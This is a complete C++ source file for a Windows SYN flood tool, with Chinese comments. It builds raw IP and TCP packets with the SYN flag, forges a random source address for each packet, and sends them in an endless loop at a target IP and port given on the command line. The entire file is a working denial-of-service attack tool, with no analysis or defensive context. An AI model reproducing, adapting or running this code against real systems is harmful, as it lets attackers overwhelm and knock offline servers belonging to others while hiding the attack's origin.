/************************************************************************/
/*	synFlood.cpp														*/
/*	2013-03-18                                                          */
/************************************************************************/
#include <stdio.h>
#include <winsock2.h>
#include <time.h>
#include <windows.h>
#include <string.h>
#include <WS2TCPIP.H>
#include "synFlood.h"
 
#define SLEEPTIME 10
 
SOCKET sock;
SOCKADDR_IN addr_in;
IP_HDR ipHdr;
TCP_HDR tcpHdr;
PRE_HDR preHdr;
int SourcePort;
char sendBuf[60]={0};
int rect;
 
#pragma comment(lib, "ws2_32.lib")
 
//计算校验和的子函数
ushort chkSum(ushort *buffer, int size)
{	
	ulong cksum=0;
	while(size >1)
	{
		cksum+=*buffer++;
		size -=sizeof(ushort);		
	}
	if(size)	
	{	
		cksum += *(uchar*)buffer;		
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >>16);
	return (ushort)(~cksum);
}
//数据包首部填充
int dataFill(char * argv[])
{
	srand((int)time(0));
	//填充IP首部
	ipHdr.h_verlen=(4<<4 | sizeof(ipHdr)/sizeof(ulong));	
	ipHdr.tos=0;
	ipHdr.total_len=htons(sizeof(ipHdr)+sizeof(ipHdr)); //IP总长度
	ipHdr.ident=1;
	ipHdr.frag_and_flags=0; //无分片
	ipHdr.ttl=(uchar)GetTickCount()%87+123;;	
	ipHdr.protocols=IPPROTO_TCP; // 协议类型为 TCP
	ipHdr.chksum=0; //效验位先初始为0
	ipHdr.sourceIP=htonl(GetTickCount()*474695); //随机产生一个伪造的源IP
	ipHdr.destIP=inet_addr(argv[1]); //目标IP
	//printf("%d\n\n",ipHdr.destIP);
	//填充TCP首部
	SourcePort=GetTickCount()*43557%9898; //随机产生一个本机端口号
	//printf("%d\n\n",SourcePort);
	tcpHdr.destPort=htons(atoi(argv[2])); //目的端口
	tcpHdr.sourcePort=htons(SourcePort); //源端口号
	tcpHdr.seq=htonl(0x12345678); 
	tcpHdr.ack=0; 
	tcpHdr.h_lenres=(sizeof(tcpHdr)/4<<4|0);
	tcpHdr.flag=2; //为SYN请求
	tcpHdr.win=htons(512);//窗口大小
	tcpHdr.urgpoint=0;
	tcpHdr.chksum=0;
	
	//填充TCP伪首部用来计算TCP头部的效验和
	preHdr.sourceAddr=ipHdr.sourceIP;	
	preHdr.destAddr=ipHdr.destIP;
	preHdr.mbz=0;
	preHdr.ptcl=IPPROTO_TCP;
	preHdr.tcplen=htons(sizeof(tcpHdr));//tcp协议长度
 
	return true;
}
//发送数据
int sendData()
{
	rect=sendto(sock, sendBuf, sizeof(ipHdr)+sizeof(tcpHdr), 0, (struct sockaddr*)&addr_in, sizeof(addr_in));
	if (rect==SOCKET_ERROR)	
	{	
		printf("send error!:%x",WSAGetLastError());	
		return false;	
	}else
		printf("success send\n");	
	Sleep(SLEEPTIME);
	return true;
}
int main(int argc,char *argv[])
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;
	BOOL flag;
	//socket版本检测
	wVersionRequested = MAKEWORD( 2, 2 );
	err = WSAStartup( wVersionRequested, &wsaData );
	if ( err != 0 ) {
		printf("WSAStartup Error!");
		return false;
	}
	if ( LOBYTE( wsaData.wVersion ) != 2 ||
        HIBYTE( wsaData.wVersion ) != 2 ) {
		printf("Could not find a usable WinSock DLL\n");
		WSACleanup( );
		return false; 
	}
	//输入检测
	if (argc < 3 || argc >4 )
	{ 
		printf("input error!\n");
		return false;
	}
	if ((sock=socket(AF_INET,SOCK_RAW,IPPROTO_IP))==INVALID_SOCKET)//管理员权限才可以生成原始套接字
	{
		printf("Socket Error!\n");
		return false;
	}
	flag=true;
	if (setsockopt(sock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR)
	{
		printf("setsockopt IP_HDRINCL error!\n");
		return false;
	}	
	int nSendTime=30*1000;	//设置超时时间
	if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&nSendTime, sizeof(nSendTime))==SOCKET_ERROR) 		
	{		
		printf("setsockopt SO_SNDTIMEO error!\n");		
		return false;		
	}
	addr_in.sin_family=AF_INET;
	addr_in.sin_port=htons(atoi(argv[2]));//目的端口
	addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);//目的ip
	while(1)
	{
		dataFill(argv);
		//利用tcp报头与伪报头计算校验和
		memcpy(sendBuf, &preHdr, sizeof(preHdr));
		memcpy(sendBuf+sizeof(preHdr), &tcpHdr, sizeof(tcpHdr));
		tcpHdr.chksum=chkSum((ushort *)sendBuf,sizeof(preHdr)+sizeof(tcpHdr));
		//将伪造的ip报头与tcp报头封装发送
		memcpy(sendBuf, &ipHdr, sizeof(ipHdr));
		memcpy(sendBuf+sizeof(ipHdr), &tcpHdr, sizeof(tcpHdr));
		sendData();
	}
	closesocket(sock);
	WSACleanup();
 
	return 0;
 
}
